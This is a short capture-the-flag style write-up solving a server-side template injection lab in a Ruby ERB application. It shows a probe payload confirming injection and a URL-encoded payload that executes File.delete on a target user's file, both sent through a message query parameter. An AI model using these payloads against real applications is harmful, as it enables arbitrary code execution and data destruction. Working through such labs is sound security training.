# Lab 1

## Description

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

## Solution

When a product is out of stock, a GET request is triggered to render the out of stock message:

```
Unfortunately this product is out of stocktest
```

The description hints on ERB documentation. This means SSTI happens inside `<%%>`. Using this knowledge:

```
GET /?message=<%=+7*7+%>
```

returns:

```
[...]
<div>49
</div>
[...]
```

which confirms SSTI. 

To solve the lab we need to delete the following file:

```
/home/carlos/morale.txt
```

In payload:

```
GET /?message=%3c%25%3d%20File.delete(%22%2fhome%2fcarlos%2fmorale.txt%22)%20%25%3e%20
```

solves the lab.
